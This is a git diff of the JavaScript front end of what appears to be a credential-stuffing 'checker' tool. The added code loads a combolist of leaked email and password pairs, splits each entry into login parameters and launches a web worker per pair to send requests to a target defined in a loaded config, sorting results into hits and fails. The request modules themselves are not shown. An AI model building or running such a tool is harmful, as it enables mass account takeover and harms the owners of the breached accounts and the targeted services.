@@ -10,6 +10,7 @@ const Requests = require("./src/App/services/Requests.js")
 const LoadConfig = require("./src/App/services/LoadConfig.js")
 const LoadCombo = require("./src/App/services/LoadCombo.js")
 const LoadConfigFromUrl = require("./src/App/services/LoadConfigFromUrl.js")
+const RequestWork = require("./src/App/services/RequestWork.js")
 
 const Checker = {
   running: false,
@@ -25,6 +26,9 @@ const Combo = {
   loaded: false,
 }
 
+const Workers = [
+
+]
 
 function ShowMessage(MessageText, MessageType){
   $(".messages").append("<div id='appMessage' style='display:none' class='alert alert-" + MessageType + "'>" + MessageText + "</div>")
@@ -39,31 +43,57 @@ function ShowMessage(MessageText, MessageType){
 
 }
 
-window.onload = function(){
 
-  $("#startBtn").click(() => {
+function getRandomInt(min, max) {
+  min = Math.ceil(min);
+  max = Math.floor(max);
+  return Math.floor(Math.random() * (max - min + 1)) + min;
+}
 
-      if(Config.loaded === false) return ShowMessage("Please load config before you start.", "danger")
-      if(Combo.loaded === false) return ShowMessage("Please load combolist before you start.", "danger")
 
-      $(".results").fadeIn(500)
+window.onload = async function(){
 
-      console.log("Starting...")
-      const requests = new Requests()
+  $("#stopBtn").click(() => {
+    Workers.forEach((Worker) => {
+      Worker.terminate()
+    })
+  })
+  $("#startBtn").click(async () => {
 
-      Combo.list.forEach((value) => {
-        console.log(value)
-       // requests.execute(Config.Main, Params)
-      })
+    if(Config.loaded === false) return ShowMessage("Please load config before you start.", "danger")
+    if(Combo.loaded === false) return ShowMessage("Please load combolist before you start.", "danger")
+
+
+    console.log("Starting...")
+
+    $(".hits").fadeIn(1000, () => {
+      $(".fails").fadeIn(1000)
+    })
+
+    const requests = new Requests()
+
+    Combo.list.forEach( async (Credentials = String) => {
+      let formatedCredentials = String(Credentials).replace(":", "|").replace(';', "|").split('|')
+      let Params = {
+        email: formatedCredentials[0],
+        password: formatedCredentials[1]
+      }
+      
+      Workers.push( new Worker(await RequestWork(Config.Main, Params, requests)))
+    
+    })
+
+    console.log(Workers)
 
 
 
   })
 
-  $("#ResetComboBtn").click(()=>{
-    
-    if(Checker.running === true) return ShowMessage("Stop checker before reset combo", "danger")
 
+
+  $("#ResetComboBtn").click(()=>{
+    if(Checker.running === true) return ShowMessage("Stop checker before reset combo", "danger")
+    
     Combo.list = []
     Combo.loaded = false
     $(".combolist-text-loaded").slideUp(500, () => {
@@ -72,6 +102,8 @@ window.onload = function(){
     })
 
   })
+
+
   $("#ResetConfigBtn").click(() => {
       $(".configDetails").slideUp(600, () => {
         $("#configFileDragAndDrop").slideDown(200)
@@ -85,11 +117,13 @@ window.onload = function(){
   
   })
 
+
   function isValidURL(str) {
     var a  = document.createElement('a');
     a.href = str;
     return (a.host && a.host != window.location.host);
   }
+
 
   $("#LoadConfig").click(async function (e){
 
@@ -110,10 +144,12 @@ window.onload = function(){
 
   })
 
+
   configDropContainer.ondragover = function (e){
     e.preventDefault()
     e.stopPropagation()
   }
+
 
   configDropContainer.ondrop= function (e){
     e.preventDefault();
@@ -122,11 +158,12 @@ window.onload = function(){
     LoadConfig(e)
 
   }
+
+
   configDropContainer.ondragend = function (e){
     e.preventDefault();
     e.stopPropagation();
   }
-
 
 
   comboListDropContainer.ondragover = function (e){
@@ -134,13 +171,16 @@ window.onload = function(){
     e.stopPropagation()
   }
 
+
   comboListDropContainer.ondrop = async (e) => {
     await LoadCombo(e)
   }
+
 
   comboListDropContainer.ondragend = function (e){
     e.preventDefault();
     e.stopPropagation();
   }
   
+
 }
